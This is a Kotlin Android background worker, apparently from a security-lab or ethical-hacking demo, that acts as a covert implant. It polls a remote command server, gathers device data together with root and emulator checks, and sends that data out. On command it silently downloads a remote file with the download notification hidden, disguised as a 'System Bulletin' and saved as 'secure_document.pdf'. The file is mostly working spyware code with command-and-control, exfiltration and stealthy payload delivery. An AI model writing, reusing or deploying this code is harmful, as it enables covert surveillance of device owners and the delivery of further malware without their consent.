package com.example.securitylab.worker

import android.app.DownloadManager
import android.content.Context
import android.net.Uri
import android.os.Environment
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.example.securitylab.DataHarvester
import com.example.securitylab.SecurityGuard
import com.example.securitylab.TelemetryClient
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class StealthSyncWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    override fun doWork(): Result {
        return try {
            val command = pollCommand()
            if (command != "NO_OP") {
                val payload = JSONObject().apply {
                    put("cmd_executed", command)
                    put("is_rooted", SecurityGuard.checkRoot())
                    put("is_emulator", SecurityGuard.isEmulator())
                    put("data", DataHarvester.harvestDeviceInfo(applicationContext))
                }.toString()

                TelemetryClient.sendEncryptedData(payload)

                if (command == "PUSH_PAYLOAD") {
                    fetchAndDownloadAsset(applicationContext)
                }
            }
            Result.success()
        } catch (e: Exception) {
            Result.retry()
        }
    }

    private fun pollCommand(): String {
        return try {
            val url = URL("https://cehdemo.onrender.com/command")
            val connection = (url.openConnection() as HttpURLConnection).apply {
                requestMethod = "GET"
                connectTimeout = 5000
            }
            if (connection.responseCode == 200) {
                val response = connection.inputStream.bufferedReader().use { it.readText() }
                JSONObject(response).optString("command", "NO_OP")
            } else "NO_OP"
        } catch (e: Exception) { "NO_OP" }
    }

    private fun fetchAndDownloadAsset(context: Context) {
        try {
            val url = URL("https://cehdemo.onrender.com/check_payload")
            val connection = (url.openConnection() as HttpURLConnection).apply { connectTimeout = 5000 }
            if (connection.responseCode == 200) {
                val response = connection.inputStream.bufferedReader().use { it.readText() }
                val json = JSONObject(response)
                val fileUrl = json.optString("file_url", "")

                if (fileUrl.isNotEmpty()) {
                    val request = DownloadManager.Request(Uri.parse(fileUrl)).apply {
                        setTitle("System Bulletin")
                        setDescription("Synchronizing secure asset...")
                        setNotificationVisibility(DownloadManager.Request.VISIBILITY_HIDDEN)
                        setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "secure_document.pdf")
                    }
                    val manager = context.getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager
                    manager.enqueue(request)
                }
            }
        } catch (e: Exception) {}
    }

    companion object {
        fun executeSyncNow(context: Context) {
            Thread {
                try {
                    val payload = JSONObject().apply {
                        put("cmd_executed", "MANUAL_TRIGGER")
                        put("is_rooted", SecurityGuard.checkRoot())
                        put("is_emulator", SecurityGuard.isEmulator())
                        put("data", DataHarvester.harvestDeviceInfo(context))
                    }.toString()
                    TelemetryClient.sendEncryptedData(payload)
                } catch (e: Exception) {}
            }.start()
        }
    }
}
